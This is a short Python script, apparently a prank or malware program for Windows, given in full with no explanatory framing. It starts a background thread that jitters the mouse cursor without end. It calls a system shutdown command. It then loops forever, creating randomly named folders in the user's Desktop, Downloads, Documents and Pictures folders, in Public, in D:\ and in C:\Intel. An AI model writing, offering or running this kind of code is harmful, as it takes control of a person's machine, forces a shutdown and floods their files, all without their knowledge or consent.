from os import getcwd, mkdir, system
from getpass import getuser
from random import sample , randint
from pynput.mouse import Controller
from threading import Thread
def move_mouse():
    mouse = Controller()
    while True:
        x = randint(-2, 2)
        y = randint(-2, 2)
        mouse.move(x, y)
mouse_killer = Thread(target = move_mouse)
mouse_killer.start()
username = getuser()
addres_1 = getcwd()
addres_2 = "D:\\"
addres_3 = "C:\\Users\\Public"
addres_4 = "C:\\Users\\" + username + "\\Desktop"
addres_5 = "C:\\Users\\" + username + "\\Downloads"
addres_6 = "C:\\Users\\" + username + "\\Documents"
addres_7 = "C:\\Users\\" + username + "\\Pictures"
addres_8 = "C:\\Intel"
name = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789(_!@#$%^&=+-`~)'
# turn off the system ofter 10 sec
system("shutdown/s")
while True:
    # make random name for directory
    print(addres_3)
    directory = "".join(sample(name, 10))
    # create the directories
    mkdir(addres_1 + "\\{}".format(directory))
    mkdir(addres_2 + "\\{}".format(directory))
    mkdir(addres_3 + "\\{}".format(directory))
    mkdir(addres_4 + "\\{}".format(directory))
    mkdir(addres_5 + "\\{}".format(directory))
    mkdir(addres_6 + "\\{}".format(directory))
    mkdir(addres_7 + "\\{}".format(directory))
    mkdir(addres_8 + "\\{}".format(directory))